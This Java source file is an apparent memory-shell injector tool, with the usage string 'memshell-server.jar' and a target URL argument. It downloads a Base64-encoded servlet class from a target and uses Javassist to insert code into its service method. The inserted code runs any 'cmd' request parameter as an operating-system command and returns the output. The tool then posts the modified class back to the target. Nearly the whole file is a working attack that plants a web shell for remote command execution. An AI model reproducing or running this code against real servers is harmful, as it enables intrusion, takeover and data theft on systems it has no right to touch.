package com.rzte.agentcrack;

import java.util.Base64;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;

/**
 * Hello world!
 *
 */
public class App 
{
    public static byte[] modifyClass(byte[] classBytes) throws Exception {
        // 创建一个 ClassPool 对象，用于管理类字节码
        ClassPool pool = ClassPool.getDefault();
        // 从字节数组中创建一个 CtClass 对象，表示待修改的类
        CtClass cc = pool.makeClass(new java.io.ByteArrayInputStream(classBytes));
        try {
            CtMethod cm = cc.getDeclaredMethod("service", new CtClass[]{
                pool.get(HttpServletRequest.class.getName()),
                pool.get(HttpServletResponse.class.getName()),
            });

            cm.insertBefore("; String cmd = req.getParameter(\"cmd\");\n" + //
                    "if (cmd != null){\n" + //
                    "java.io.InputStream inputStream = java.lang.Runtime.getRuntime().exec(cmd).getInputStream();\n" + //
                    "byte[] data = new byte[4096];\n" + //
                    "int n = inputStream.read(data);\n" + //
                    "inputStream.close();\n" + //
                    "resp.sendError(javax.servlet.http.HttpServletResponse.SC_BAD_REQUEST, new String(data, 0, n));\n" + //
                    "return;\n" + //
                    "}");

            return cc.toBytecode();
        } catch (NotFoundException e) {
            // 如果没有找到 "httpGet" 方法，打印异常信息
            e.printStackTrace();
        } catch (Exception e) {
            // 如果发生其他异常，打印异常信息
            e.printStackTrace();
        }

        return null;
    }


    public static void main( String[] args ) throws Exception
    {
        if (args.length != 1){
            System.out.println("Usage: java -cp memshell-server.jar com.rzte.agentcrack.App <target_url>");
            return;
        }
        String url = args[0];
        String data = HttpUtil.sendHttpGetRequest(url);
        System.out.println("get ===============> \n" + data);
        if (data.length() < 100){
            System.out.println("\nnot supported");
            return;
        }

        byte[] newData = modifyClass(Base64.getDecoder().decode(data.trim()));
        
        String output = HttpUtil.sendHttpPostRequest(url, Base64.getEncoder().encodeToString(newData));
        System.out.println("post ===============> \n" + output);
    }
}
